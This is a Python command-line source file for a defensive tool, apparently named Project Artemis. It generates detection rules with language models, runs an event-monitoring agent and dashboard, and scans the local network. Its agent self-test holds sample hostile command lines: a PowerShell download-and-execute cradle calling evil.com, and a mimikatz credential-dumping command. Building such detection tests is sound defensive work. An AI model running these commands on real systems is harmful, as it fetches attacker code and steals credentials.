"""Command-line interface for Project Artemis."""

import asyncio
import json
import sys
from datetime import datetime
from pathlib import Path
from typing import Optional

import click
from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax
from rich.table import Table

from artemis import __version__
from artemis.core import Artemis
from artemis.models import RuleFormat, GenerationResult


console = Console()


def print_result(result: GenerationResult, output_format: str = "pretty"):
    """Print generation result."""
    if output_format == "json":
        data = {
            "success": result.success,
            "model": result.model_used,
            "tokens": result.tokens_used,
            "time_ms": result.generation_time_ms,
        }
        if result.success and result.rule:
            data["rule"] = {
                "id": result.rule.id,
                "name": result.rule.name,
                "format": result.rule.format.value,
                "severity": result.rule.severity.value,
                "is_valid": result.rule.is_valid,
                "validation_errors": result.rule.validation_errors,
                "content": result.rule.content,
                "mitre": [m.model_dump() for m in result.rule.mitre],
            }
        else:
            data["error"] = result.error
        
        console.print_json(json.dumps(data, indent=2))
        return
    
    if output_format == "raw":
        if result.success and result.rule:
            print(result.rule.content)
        else:
            console.print(f"[red]Error:[/red] {result.error}")
        return
    
    # Pretty output
    if not result.success:
        console.print(Panel(
            f"[red]Generation failed:[/red] {result.error}",
            title="Error",
            border_style="red",
        ))
        return
    
    rule = result.rule
    
    # Header info
    console.print()
    console.print(f"[bold green]Generated {rule.format.value.upper()} Rule[/bold green]")
    console.print(f"[dim]Model: {result.model_used} | Tokens: {result.tokens_used} | Time: {result.generation_time_ms}ms[/dim]")
    console.print()
    
    # Validation status
    if rule.is_valid:
        console.print("[green]Validation: PASSED[/green]")
    else:
        console.print("[red]Validation: FAILED[/red]")
        for error in rule.validation_errors:
            console.print(f"  [red]-[/red] {error}")
    console.print()
    
    # Rule metadata table
    table = Table(show_header=False, box=None, padding=(0, 2))
    table.add_column("Field", style="cyan")
    table.add_column("Value")
    
    table.add_row("ID", rule.id)
    table.add_row("Name", rule.name)
    table.add_row("Severity", rule.severity.value.upper())
    
    if rule.mitre:
        mitre_str = ", ".join(f"{m.technique_id}" for m in rule.mitre)
        table.add_row("MITRE", mitre_str)
    
    if rule.tags:
        table.add_row("Tags", ", ".join(rule.tags[:5]) + ("..." if len(rule.tags) > 5 else ""))
    
    console.print(table)
    console.print()
    
    # Rule content
    syntax = Syntax(rule.content, "yaml", theme="monokai", line_numbers=True)
    console.print(Panel(syntax, title="Rule Content", border_style="blue"))


@click.group()
@click.version_option(version=__version__, prog_name="artemis")
def main():
    """Project Artemis - AI-powered detection engineering platform.
    
    Generate detection rules from natural language threat descriptions.
    """
    pass


@main.command()
@click.argument("description")
@click.option("-f", "--format", "rule_format", default="sigma",
              type=click.Choice(["sigma", "yara", "splunk", "kql", "snort"]),
              help="Output format (default: sigma)")
@click.option("-p", "--provider", default="anthropic",
              type=click.Choice(["anthropic", "openai", "ollama"]),
              help="LLM provider (default: anthropic)")
@click.option("-m", "--model", default=None, help="Model name override")
@click.option("-c", "--context", default=None, help="Additional context")
@click.option("-i", "--indicator", multiple=True, help="Known IOC or pattern (can repeat)")
@click.option("-s", "--severity", default=None,
              type=click.Choice(["low", "medium", "high", "critical"]),
              help="Severity hint")
@click.option("-o", "--output", "output_format", default="pretty",
              type=click.Choice(["pretty", "json", "raw"]),
              help="Output format (default: pretty)")
@click.option("--save", type=click.Path(), help="Save rule to file")
def generate(
    description: str,
    rule_format: str,
    provider: str,
    model: Optional[str],
    context: Optional[str],
    indicator: tuple,
    severity: Optional[str],
    output_format: str,
    save: Optional[str],
):
    """Generate a detection rule from a threat description.
    
    Examples:
    
        artemis generate "Detect PowerShell downloading files"
        
        artemis generate "Mimikatz credential dumping" -s critical
        
        artemis generate "Suspicious DNS queries" -p ollama -m qwen3:32b
    """
    try:
        format_enum = RuleFormat(rule_format)
    except ValueError:
        console.print(f"[red]Unsupported format: {rule_format}[/red]")
        sys.exit(1)
    
    try:
        engine = Artemis(provider=provider, model=model)
    except Exception as e:
        console.print(f"[red]Failed to initialize: {e}[/red]")
        sys.exit(1)
    
    indicators = list(indicator) if indicator else None
    
    with console.status("[bold blue]Generating detection rule..."):
        result = engine.generate_sync(
            description=description,
            format=format_enum,
            context=context,
            indicators=indicators,
            severity_hint=severity,
        )
    
    print_result(result, output_format)
    
    if save and result.success and result.rule:
        path = Path(save)
        path.write_text(result.rule.content)
        console.print(f"\n[green]Rule saved to:[/green] {path}")
    
    if not result.success:
        sys.exit(1)


@main.command()
@click.argument("input_file", type=click.Path(exists=True))
@click.option("-f", "--format", "rule_format", default="sigma",
              type=click.Choice(["sigma", "yara", "splunk", "kql", "snort"]),
              help="Output format")
@click.option("-p", "--provider", default="anthropic", help="LLM provider")
@click.option("-o", "--output-dir", type=click.Path(), help="Output directory for rules")
def batch(input_file: str, rule_format: str, provider: str, output_dir: Optional[str]):
    """Generate rules from a file of threat descriptions (one per line)."""
    input_path = Path(input_file)
    descriptions = [
        line.strip() for line in input_path.read_text().splitlines()
        if line.strip() and not line.startswith("#")
    ]
    
    if not descriptions:
        console.print("[yellow]No descriptions found in input file[/yellow]")
        return
    
    console.print(f"[blue]Processing {len(descriptions)} threat descriptions...[/blue]")
    
    try:
        engine = Artemis(provider=provider)
        format_enum = RuleFormat(rule_format)
    except Exception as e:
        console.print(f"[red]Failed to initialize: {e}[/red]")
        sys.exit(1)
    
    if output_dir:
        out_path = Path(output_dir)
        out_path.mkdir(parents=True, exist_ok=True)
    
    async def run_batch():
        results = await engine.generate_batch(descriptions, format=format_enum)
        return results
    
    results = asyncio.run(run_batch())
    
    success_count = 0
    for i, (desc, result) in enumerate(zip(descriptions, results)):
        console.print(f"\n[bold]Rule {i+1}/{len(descriptions)}[/bold]: {desc[:50]}...")
        
        if result.success:
            success_count += 1
            console.print(f"  [green]OK[/green] - {result.rule.name}")
            
            if output_dir:
                filename = f"rule_{i+1:03d}.yml"
                (out_path / filename).write_text(result.rule.content)
        else:
            console.print(f"  [red]FAILED[/red] - {result.error}")
    
    console.print(f"\n[bold]Complete:[/bold] {success_count}/{len(descriptions)} rules generated")


@main.command()
def formats():
    """List supported detection rule formats."""
    table = Table(title="Supported Formats")
    table.add_column("Format", style="cyan")
    table.add_column("Status", style="green")
    table.add_column("Description")
    
    table.add_row("sigma", "Available", "Generic detection format, converts to many SIEMs")
    table.add_row("yara", "Available", "Pattern matching for malware/files")
    table.add_row("splunk", "Available", "Splunk SPL queries")
    table.add_row("kql", "Available", "Microsoft Sentinel/Defender KQL queries")
    table.add_row("snort", "Available", "Snort/Suricata network IDS rules")
    
    console.print(table)


@main.command()
@click.argument("rule_file", type=click.Path(exists=True))
@click.option("-f", "--format", "rule_format", default="sigma",
              type=click.Choice(["sigma", "yara", "splunk", "kql", "snort"]),
              help="Rule format")
def validate(rule_file: str, rule_format: str):
    """Validate an existing detection rule."""
    from artemis.generators import SigmaGenerator, YaraGenerator, SplunkGenerator, KqlGenerator, SnortGenerator
    from artemis.models import DetectionRule
    
    content = Path(rule_file).read_text()
    
    # Create a minimal rule object for validation
    rule = DetectionRule(
        id="validation",
        name="Validation Check",
        description="",
        format=RuleFormat(rule_format),
        content=content,
        severity="medium",
    )
    
    # Use appropriate generator's validate method
    generators = {
        "sigma": SigmaGenerator,
        "yara": YaraGenerator,
        "splunk": SplunkGenerator,
        "kql": KqlGenerator,
        "snort": SnortGenerator,
    }
    generator = generators[rule_format](llm=None)  # Don't need LLM for validation
    is_valid, errors = generator.validate_rule(rule)
    
    if is_valid:
        console.print(Panel(
            "[green]Rule is valid![/green]",
            title="Validation Result",
            border_style="green",
        ))
    else:
        error_text = "\n".join(f"[red]-[/red] {e}" for e in errors)
        console.print(Panel(
            f"[red]Validation failed:[/red]\n\n{error_text}",
            title="Validation Result", 
            border_style="red",
        ))
        sys.exit(1)


@main.command()
@click.option("-h", "--host", default="127.0.0.1", help="Host to bind to")
@click.option("-p", "--port", default=8000, type=int, help="Port to listen on")
def serve(host: str, port: int):
    """Start the web UI server."""
    try:
        import uvicorn
    except ImportError:
        console.print("[red]uvicorn not installed. Run: pip install uvicorn[/red]")
        sys.exit(1)
    
    console.print(f"[bold green]Starting Project Artemis Web UI[/bold green]")
    console.print(f"[blue]http://{host}:{port}[/blue]")
    console.print("[dim]Press Ctrl+C to stop[/dim]\n")
    
    from artemis.web.app import app
    uvicorn.run(app, host=host, port=port)


@main.command()
@click.option("-h", "--host", default="127.0.0.1", help="Host to bind to")
@click.option("-p", "--port", default=8888, type=int, help="Port to listen on")
@click.option("-m", "--model", default="deepseek-r1:70b", help="AI model for analysis")
@click.option("--provider", default="ollama", help="LLM provider")
@click.option("-v", "--verbose", is_flag=True, help="Verbose logging")
def soc(host: str, port: int, model: str, provider: str, verbose: bool):
    """Start the Security Operations Center.
    
    Launches the full autonomous security platform:
    - Real-time dashboard with network topology
    - Continuous network scanning and device discovery
    - Connection monitoring and traffic analysis
    - AI-powered threat detection (DeepSeek)
    - Live WebSocket updates
    
    This is the all-seeing eye for your network.
    """
    import logging
    
    if verbose:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)
    
    try:
        import uvicorn
    except ImportError:
        console.print("[red]uvicorn not installed. Run: pip install uvicorn[/red]")
        sys.exit(1)
    
    console.print(Panel.fit(
        f"[bold cyan]ARTEMIS Security Operations Center[/bold cyan]\n\n"
        f"[dim]Dashboard:[/dim] [blue]http://{host}:{port}[/blue]\n"
        f"[dim]AI Model:[/dim] {provider}/{model}\n"
        f"[dim]Mode:[/dim] Autonomous Monitoring\n\n"
        f"[green]The All-Seeing Eye is watching...[/green]",
        border_style="cyan",
    ))
    console.print("[dim]Press Ctrl+C to stop[/dim]\n")
    
    # Start the autonomous agent alongside the web server
    async def run_soc():
        from artemis.web.app import app
        from artemis.web.realtime import state as security_state
        from artemis.agent.autonomous import AutonomousAgent
        
        # Create and configure agent
        agent = AutonomousAgent(model=model, provider=provider)
        
        # Connect agent to WebSocket state
        agent.on_device_update(security_state.update_device)
        agent.on_connection(security_state.add_connection)
        agent.on_threat(security_state.add_threat)
        agent.on_ai_analysis(security_state.add_ai_analysis)
        agent.on_traffic(security_state.update_traffic)
        
        # Start web server in background task (non-blocking)
        config = uvicorn.Config(app, host=host, port=port, log_level="info")
        server = uvicorn.Server(config)
        server_task = asyncio.create_task(server.serve())
        
        # Give server a moment to bind
        await asyncio.sleep(0.5)
        
        # Start agent (background tasks)
        await agent.start()
        
        # Update agent status periodically
        async def status_updater():
            while agent._running:
                await security_state.update_agent_status(agent.get_status())
                await asyncio.sleep(5)
        
        asyncio.create_task(status_updater())
        
        # Wait for server to complete (or be interrupted)
        await server_task
    
    try:
        asyncio.run(run_soc())
    except KeyboardInterrupt:
        console.print("\n[yellow]Shutting down...[/yellow]")


# ============================================================================
# Agent Commands - Autonomous Detection & Response
# ============================================================================

@main.group()
def agent():
    """Autonomous detection and response agent.
    
    The Artemis agent continuously monitors system events,
    analyzes them with AI, and takes defensive actions.
    """
    pass


@agent.command()
@click.option("-p", "--provider", default="ollama",
              type=click.Choice(["ollama", "anthropic", "openai"]),
              help="LLM provider (default: ollama)")
@click.option("-m", "--model", default="deepseek-r1:70b", help="Model name")
@click.option("-c", "--channel", multiple=True, help="Event log channel to monitor")
@click.option("--priority-only", is_flag=True, help="Only monitor high-value event IDs")
@click.option("--auto-actions", is_flag=True, help="Enable automatic defensive actions")
@click.option("--no-notify", is_flag=True, help="Disable desktop notifications")
@click.option("-v", "--verbose", is_flag=True, help="Verbose logging")
@click.option("--batch-size", default=20, type=int, help="Events per analysis batch")
@click.option("--interval", default=10.0, type=float, help="Minimum seconds between analyses")
def start(
    provider: str,
    model: str,
    channel: tuple,
    priority_only: bool,
    auto_actions: bool,
    no_notify: bool,
    verbose: bool,
    batch_size: int,
    interval: float,
):
    """Start the Artemis agent daemon.
    
    The agent will monitor Windows Event Logs in real-time,
    analyze events using AI, and respond to threats.
    
    Examples:
    
        artemis agent start
        
        artemis agent start -p ollama -m qwen3:32b --auto-actions
        
        artemis agent start --priority-only -v
    """
    import logging
    from artemis.agent import ArtemisDaemon
    
    # Configure logging
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    )
    
    # Suppress verbose libraries
    logging.getLogger("httpx").setLevel(logging.WARNING)
    logging.getLogger("httpcore").setLevel(logging.WARNING)
    
    channels = list(channel) if channel else None
    
    console.print(Panel.fit(
        "[bold cyan]ARTEMIS AGENT[/bold cyan]\n"
        "[dim]Autonomous Detection & Response[/dim]",
        border_style="cyan",
    ))
    console.print()
    
    table = Table(show_header=False, box=None)
    table.add_column("Setting", style="cyan")
    table.add_column("Value")
    
    table.add_row("Provider", f"{provider}")
    table.add_row("Model", f"{model}")
    table.add_row("Channels", ", ".join(channels) if channels else "All supported")
    table.add_row("Priority Only", "Yes" if priority_only else "No")
    table.add_row("Auto Actions", "[yellow]ENABLED[/yellow]" if auto_actions else "Disabled")
    table.add_row("Notifications", "Disabled" if no_notify else "Enabled")
    table.add_row("Analysis Interval", f"{interval}s")
    
    console.print(table)
    console.print()
    console.print("[dim]Press Ctrl+C to stop[/dim]")
    console.print()
    
    daemon = ArtemisDaemon(
        provider=provider,
        model=model,
        channels=channels,
        priority_only=priority_only,
        auto_actions=auto_actions,
        notify_enabled=not no_notify,
        batch_size=batch_size,
        analysis_interval=interval,
    )
    
    # Run the daemon
    try:
        asyncio.run(daemon.start())
    except KeyboardInterrupt:
        console.print("\n[yellow]Stopping agent...[/yellow]")


@agent.command()
def status():
    """Check agent status and statistics.
    
    Shows whether the agent is running and recent activity.
    """
    import json
    from pathlib import Path
    
    log_dir = Path.home() / ".artemis" / "logs"
    
    # Check for recent threat logs
    threat_files = sorted(log_dir.glob("threats_*.jsonl"), reverse=True)
    alert_file = log_dir / "alerts.jsonl"
    
    console.print(Panel.fit(
        "[bold cyan]ARTEMIS AGENT STATUS[/bold cyan]",
        border_style="cyan",
    ))
    console.print()
    
    # Recent threats
    if threat_files:
        console.print("[bold]Recent Threat Logs:[/bold]")
        for f in threat_files[:3]:
            try:
                lines = f.read_text().strip().split("\n")
                console.print(f"  {f.name}: {len(lines)} entries")
            except Exception:
                pass
    else:
        console.print("[dim]No threat logs found[/dim]")
    
    console.print()
    
    # Recent alerts
    if alert_file.exists():
        try:
            lines = alert_file.read_text().strip().split("\n")
            console.print(f"[bold]Alerts:[/bold] {len(lines)} total")
            
            # Show last 5 alerts
            for line in lines[-5:]:
                try:
                    entry = json.loads(line)
                    console.print(f"  [{entry.get('timestamp', 'unknown')[:19]}] {entry.get('description', 'Unknown')}")
                except Exception:
                    pass
        except Exception:
            pass
    
    console.print()
    console.print("[dim]Run 'artemis agent start' to start monitoring[/dim]")


@agent.command()
@click.option("--all", "show_all", is_flag=True, help="Show all history (not just today)")
@click.option("-n", "--limit", default=20, type=int, help="Number of entries to show")
def threats(show_all: bool, limit: int):
    """View detected threats."""
    import json
    from pathlib import Path
    from datetime import datetime
    
    log_dir = Path.home() / ".artemis" / "logs"
    
    if show_all:
        threat_files = sorted(log_dir.glob("threats_*.jsonl"), reverse=True)
    else:
        today = datetime.now().strftime("%Y-%m-%d")
        threat_files = [log_dir / f"threats_{today}.jsonl"]
    
    entries = []
    for f in threat_files:
        if f.exists():
            try:
                for line in f.read_text().strip().split("\n"):
                    if line:
                        entries.append(json.loads(line))
            except Exception:
                pass
    
    if not entries:
        console.print("[dim]No threats detected[/dim]")
        return
    
    # Sort by timestamp descending
    entries.sort(key=lambda x: x.get("timestamp", ""), reverse=True)
    entries = entries[:limit]
    
    table = Table(title=f"Detected Threats (showing {len(entries)})")
    table.add_column("Time", style="dim")
    table.add_column("Severity", style="bold")
    table.add_column("Type")
    table.add_column("Description")
    
    for entry in entries:
        action = entry.get("action", {})
        ts = entry.get("timestamp", "")[:19]
        
        # Color code severity
        severity = action.get("parameters", {}).get("severity", "UNKNOWN")
        if severity == "CRITICAL":
            sev_style = "[red]CRITICAL[/red]"
        elif severity == "HIGH":
            sev_style = "[yellow]HIGH[/yellow]"
        elif severity == "MEDIUM":
            sev_style = "[blue]MEDIUM[/blue]"
        else:
            sev_style = severity
        
        table.add_row(
            ts,
            sev_style,
            action.get("target", "unknown"),
            action.get("description", "")[:50],
        )
    
    console.print(table)


@agent.command()
def rules():
    """View generated detection rules."""
    from pathlib import Path
    
    rules_dir = Path.home() / ".artemis" / "rules"
    
    if not rules_dir.exists():
        console.print("[dim]No rules generated yet[/dim]")
        return
    
    rule_files = list(rules_dir.glob("*.yml")) + list(rules_dir.glob("*.yar"))
    
    if not rule_files:
        console.print("[dim]No rules found[/dim]")
        return
    
    table = Table(title="Generated Detection Rules")
    table.add_column("File")
    table.add_column("Size")
    table.add_column("Modified")
    
    for f in sorted(rule_files, key=lambda x: x.stat().st_mtime, reverse=True)[:20]:
        stat = f.stat()
        table.add_row(
            f.name,
            f"{stat.st_size} bytes",
            f.stat().st_mtime,
        )
    
    console.print(table)
    console.print(f"\n[dim]Rules directory: {rules_dir}[/dim]")


@agent.command()
@click.option("-h", "--host", default="127.0.0.1", help="Dashboard host")
@click.option("-p", "--port", default=8080, type=int, help="Dashboard port")
@click.option("--provider", default="ollama", help="LLM provider")
@click.option("-m", "--model", default="deepseek-r1:70b", help="Model name")
@click.option("--priority-only", is_flag=True, help="Only monitor high-value events")
@click.option("--auto-actions", is_flag=True, help="Enable auto-response")
@click.option("-v", "--verbose", is_flag=True, help="Verbose logging")
def dashboard(
    host: str,
    port: int,
    provider: str,
    model: str,
    priority_only: bool,
    auto_actions: bool,
    verbose: bool,
):
    """Start the real-time monitoring dashboard.
    
    Launches the Artemis agent with a web dashboard for live
    threat monitoring, event streaming, and action approval.
    
    Example:
    
        artemis agent dashboard
        
        artemis agent dashboard -p 8080 --auto-actions
    """
    import logging
    
    try:
        import uvicorn
    except ImportError:
        console.print("[red]uvicorn not installed. Run: pip install uvicorn[/red]")
        sys.exit(1)
    
    # Configure logging
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    )
    logging.getLogger("httpx").setLevel(logging.WARNING)
    logging.getLogger("httpcore").setLevel(logging.WARNING)
    logging.getLogger("uvicorn.access").setLevel(logging.WARNING)
    
    from artemis.web.dashboard import (
        create_dashboard_with_daemon, 
        state, 
        start_endpoint_monitor,
        start_network_scanner,
    )
    
    console.print(Panel.fit(
        "[bold cyan]ARTEMIS DASHBOARD[/bold cyan]\n"
        "[dim]Real-time Security Monitoring[/dim]",
        border_style="cyan",
    ))
    console.print()
    console.print(f"[bold]Dashboard:[/bold] http://{host}:{port}")
    console.print(f"[bold]Terminal:[/bold] http://{host}:{port}/terminal")
    console.print(f"[bold]Provider:[/bold] {provider}/{model}")
    console.print(f"[bold]Auto-actions:[/bold] {'[yellow]ENABLED[/yellow]' if auto_actions else 'Disabled'}")
    console.print()
    console.print("[dim]Press Ctrl+C to stop[/dim]")
    console.print()
    
    # Create integrated app with endpoint monitor
    app, daemon = create_dashboard_with_daemon(
        provider=provider,
        model=model,
        priority_only=priority_only,
        auto_actions=auto_actions,
        enable_endpoint_monitor=True,
    )
    
    # Start all services in background
    async def startup():
        import asyncio
        # Start daemon
        asyncio.create_task(daemon.start())
        # Start endpoint monitor for real-time telemetry
        asyncio.create_task(start_endpoint_monitor())
        # Initialize network scanner
        asyncio.create_task(start_network_scanner())
    
    app.on_event("startup")(startup)
    
    # Run server
    uvicorn.run(app, host=host, port=port, log_level="warning")


@agent.command()
def test():
    """Run a test analysis on sample events.
    
    This sends synthetic events through the analysis pipeline
    to verify the agent is working correctly.
    """
    from artemis.agent import ThreatAnalyzer, NormalizedEvent, EventSource
    from datetime import datetime, timezone
    import uuid
    
    console.print("[bold]Running test analysis...[/bold]\n")
    
    # Create synthetic suspicious events
    test_events = [
        NormalizedEvent(
            event_id=str(uuid.uuid4()),
            timestamp=datetime.now(timezone.utc),
            source=EventSource.WINDOWS_POWERSHELL,
            event_code=4104,
            event_type="Script Block Logging",
            message="Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
            hostname="TESTHOST",
            username="TestUser",
            process_name="powershell.exe",
            process_id=1234,
            command_line="powershell.exe -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAC...",
        ),
        NormalizedEvent(
            event_id=str(uuid.uuid4()),
            timestamp=datetime.now(timezone.utc),
            source=EventSource.WINDOWS_SECURITY,
            event_code=4688,
            event_type="Process Creation",
            message="Process created",
            hostname="TESTHOST",
            username="TestUser",
            process_name="mimikatz.exe",
            process_id=5678,
            parent_process="powershell.exe",
            command_line="mimikatz.exe privilege::debug sekurlsa::logonpasswords",
        ),
    ]
    
    console.print(f"[blue]Testing with {len(test_events)} synthetic events[/blue]")
    for e in test_events:
        console.print(f"  - {e.source.value} EventID:{e.event_code} Process:{e.process_name}")
    console.print()
    
    async def run_test():
        analyzer = ThreatAnalyzer(
            provider="ollama",
            model="deepseek-r1:70b",
        )
        await analyzer.initialize()
        return await analyzer.analyze(test_events)
    
    with console.status("[bold blue]Analyzing events with AI..."):
        try:
            assessment = asyncio.run(run_test())
        except Exception as e:
            console.print(f"[red]Test failed:[/red] {e}")
            return
    
    if assessment:
        console.print(Panel.fit(
            f"[bold]Threat Detected: {assessment.is_threat}[/bold]\n"
            f"Confidence: {assessment.confidence:.0%}\n"
            f"Severity: {assessment.severity.name}\n"
            f"Type: {assessment.threat_type}\n\n"
            f"Description: {assessment.description[:300]}...",
            title="Analysis Result",
            border_style="green" if not assessment.is_threat else "red",
        ))
        
        if assessment.mitre_techniques:
            console.print(f"\n[bold]MITRE Techniques:[/bold] {', '.join(assessment.mitre_techniques)}")
        
        if assessment.recommended_actions:
            console.print(f"\n[bold]Recommended Actions:[/bold]")
            for action in assessment.recommended_actions:
                console.print(f"  - {action}")
    else:
        console.print("[yellow]No assessment returned[/yellow]")
    
    console.print("\n[green]Test complete![/green]")


# ============================================================================
# Network Commands - Discovery & Inventory
# ============================================================================

@main.group()
def network():
    """Network discovery and device inventory.
    
    Scan your local network, discover devices, track changes,
    and maintain a network inventory.
    """
    pass


@network.command()
@click.option("-s", "--subnet", default=None, help="Subnet to scan (e.g., 192.168.1.0/24)")
@click.option("--ports", default=None, help="Comma-separated ports to probe")
@click.option("-v", "--verbose", is_flag=True, help="Verbose output")
def scan(subnet: Optional[str], ports: Optional[str], verbose: bool):
    """Scan the local network for devices.
    
    Performs ARP discovery, hostname resolution, and port probing
    to identify devices on your network.
    
    Examples:
    
        artemis network scan
        
        artemis network scan -s 10.0.0.0/24
        
        artemis network scan --ports 22,80,443,3389
    """
    from artemis.agent import NetworkScanner, DeviceCategory
    import logging
    
    if verbose:
        logging.basicConfig(level=logging.DEBUG, format="%(asctime)s [%(levelname)s] %(message)s")
    
    scan_ports = None
    if ports:
        scan_ports = [int(p.strip()) for p in ports.split(",")]
    
    async def run_scan():
        scanner = NetworkScanner(subnet=subnet, scan_ports=scan_ports)
        await scanner.initialize()
        
        console.print(Panel.fit(
            f"[bold cyan]NETWORK SCAN[/bold cyan]\n"
            f"[dim]Subnet: {scanner.subnet}[/dim]\n"
            f"[dim]Local IP: {scanner.local_ip}[/dim]\n"
            f"[dim]Gateway: {scanner.gateway_ip}[/dim]",
            border_style="cyan",
        ))
        console.print()
        
        with console.status("[bold blue]Scanning network..."):
            devices = await scanner.scan()
        
        return scanner
    
    scanner = asyncio.run(run_scan())
    
    # Display results
    devices = scanner.devices
    
    if not devices:
        console.print("[yellow]No devices found[/yellow]")
        return
    
    # Group by category
    by_category: dict[str, list] = {}
    for device in sorted(devices, key=lambda d: d.ip_address):
        cat = device.category.value
        if cat not in by_category:
            by_category[cat] = []
        by_category[cat].append(device)
    
    # Display table
    table = Table(title=f"Discovered Devices ({len(devices)} total)")
    table.add_column("IP", style="cyan")
    table.add_column("MAC")
    table.add_column("Hostname")
    table.add_column("Category", style="bold")
    table.add_column("Vendor")
    table.add_column("Status")
    table.add_column("Ports")
    
    for device in sorted(devices, key=lambda d: (d.category.value, d.ip_address)):
        status_style = "[green]online[/green]" if device.status.value == "online" else "[dim]offline[/dim]"
        
        # Mark special devices
        ip_display = device.ip_address
        if device.is_gateway:
            ip_display = f"{device.ip_address} [dim](gateway)[/dim]"
        elif device.is_local:
            ip_display = f"{device.ip_address} [dim](this host)[/dim]"
        
        table.add_row(
            ip_display,
            device.mac_address or "-",
            device.hostname or "-",
            device.category.value,
            device.vendor or "-",
            status_style,
            ", ".join(str(p) for p in device.open_ports[:5]) if device.open_ports else "-",
        )
    
    console.print(table)
    
    # Summary by category
    console.print()
    console.print("[bold]Summary by Category:[/bold]")
    for cat, cat_devices in sorted(by_category.items()):
        console.print(f"  {cat}: {len(cat_devices)}")


@network.command()
@click.option("--category", "-c", default=None, help="Filter by category")
@click.option("--online", is_flag=True, help="Show only online devices")
@click.option("-n", "--new", "new_hours", default=None, type=int, help="Show devices discovered in last N hours")
def list(category: Optional[str], online: bool, new_hours: Optional[int]):
    """List known devices from inventory.
    
    Shows devices from the saved inventory without performing a new scan.
    
    Examples:
    
        artemis network list
        
        artemis network list --online
        
        artemis network list -c router
        
        artemis network list --new 24
    """
    from artemis.agent import NetworkScanner, DeviceCategory
    
    async def load_inventory():
        scanner = NetworkScanner()
        await scanner.initialize()
        return scanner
    
    scanner = asyncio.run(load_inventory())
    devices = scanner.devices
    
    if not devices:
        console.print("[dim]No devices in inventory. Run 'artemis network scan' first.[/dim]")
        return
    
    # Apply filters
    if online:
        devices = [d for d in devices if d.status.value == "online"]
    
    if category:
        try:
            cat_enum = DeviceCategory(category.lower())
            devices = [d for d in devices if d.category == cat_enum]
        except ValueError:
            console.print(f"[red]Unknown category: {category}[/red]")
            console.print(f"[dim]Valid categories: {', '.join(c.value for c in DeviceCategory)}[/dim]")
            return
    
    if new_hours:
        devices = scanner.get_new_devices(new_hours)
    
    if not devices:
        console.print("[dim]No devices match filters[/dim]")
        return
    
    table = Table(title=f"Network Inventory ({len(devices)} devices)")
    table.add_column("IP", style="cyan")
    table.add_column("Hostname")
    table.add_column("Category")
    table.add_column("Vendor")
    table.add_column("Status")
    table.add_column("First Seen")
    table.add_column("Last Seen")
    
    for device in sorted(devices, key=lambda d: d.ip_address):
        status_style = "[green]online[/green]" if device.status.value == "online" else "[dim]offline[/dim]"
        
        table.add_row(
            device.ip_address,
            device.hostname or "-",
            device.category.value,
            device.vendor or "-",
            status_style,
            device.first_seen.strftime("%Y-%m-%d %H:%M"),
            device.last_seen.strftime("%Y-%m-%d %H:%M"),
        )
    
    console.print(table)


@network.command()
@click.option("-s", "--subnet", default=None, help="Subnet to monitor")
@click.option("-i", "--interval", default=60, type=int, help="Scan interval in seconds")
def monitor(subnet: Optional[str], interval: int):
    """Continuously monitor network for changes.
    
    Runs periodic scans and alerts when new devices appear
    or known devices go offline.
    
    Example:
    
        artemis network monitor
        
        artemis network monitor -i 30
    """
    from artemis.agent import NetworkScanner
    
    console.print(Panel.fit(
        "[bold cyan]NETWORK MONITOR[/bold cyan]\n"
        f"[dim]Interval: {interval}s[/dim]",
        border_style="cyan",
    ))
    console.print()
    console.print("[dim]Press Ctrl+C to stop[/dim]")
    console.print()
    
    async def run_monitor():
        scanner = NetworkScanner(subnet=subnet)
        await scanner.initialize()
        
        console.print(f"[blue]Monitoring subnet: {scanner.subnet}[/blue]\n")
        
        known_ips = set()
        
        while True:
            try:
                devices = await scanner.scan()
                current_ips = {d.ip_address for d in devices}
                
                # New devices
                new_ips = current_ips - known_ips
                for ip in new_ips:
                    device = scanner.get_device(ip)
                    if device:
                        console.print(
                            f"[green][NEW][/green] {device.ip_address} - "
                            f"{device.hostname or 'unknown'} ({device.category.value}) "
                            f"[{device.vendor or 'unknown vendor'}]"
                        )
                
                # Devices gone offline
                offline_ips = known_ips - current_ips
                for ip in offline_ips:
                    console.print(f"[yellow][OFFLINE][/yellow] {ip}")
                
                known_ips = current_ips
                
                if not new_ips and not offline_ips:
                    console.print(f"[dim][{datetime.now().strftime('%H:%M:%S')}] No changes ({len(devices)} devices)[/dim]")
                
            except Exception as e:
                console.print(f"[red]Scan error:[/red] {e}")
            
            await asyncio.sleep(interval)
    
    try:
        asyncio.run(run_monitor())
    except KeyboardInterrupt:
        console.print("\n[yellow]Monitor stopped[/yellow]")


@network.command()
@click.argument("ip")
def info(ip: str):
    """Show detailed info for a specific device.
    
    Example:
    
        artemis network info 192.168.1.1
    """
    from artemis.agent import NetworkScanner
    
    async def get_device():
        scanner = NetworkScanner()
        await scanner.initialize()
        return scanner.get_device(ip)
    
    device = asyncio.run(get_device())
    
    if not device:
        console.print(f"[red]Device not found: {ip}[/red]")
        console.print("[dim]Run 'artemis network scan' first[/dim]")
        return
    
    console.print(Panel.fit(
        f"[bold cyan]Device: {device.ip_address}[/bold cyan]",
        border_style="cyan",
    ))
    console.print()
    
    table = Table(show_header=False, box=None)
    table.add_column("Field", style="cyan")
    table.add_column("Value")
    
    table.add_row("IP Address", device.ip_address)
    table.add_row("MAC Address", device.mac_address or "-")
    table.add_row("Hostname", device.hostname or "-")
    table.add_row("Category", device.category.value)
    table.add_row("Vendor", device.vendor or "-")
    table.add_row("Status", device.status.value)
    table.add_row("Is Gateway", "Yes" if device.is_gateway else "No")
    table.add_row("Is Local", "Yes" if device.is_local else "No")
    table.add_row("First Seen", device.first_seen.strftime("%Y-%m-%d %H:%M:%S"))
    table.add_row("Last Seen", device.last_seen.strftime("%Y-%m-%d %H:%M:%S"))
    table.add_row("Open Ports", ", ".join(str(p) for p in device.open_ports) if device.open_ports else "-")
    
    console.print(table)


@network.command()
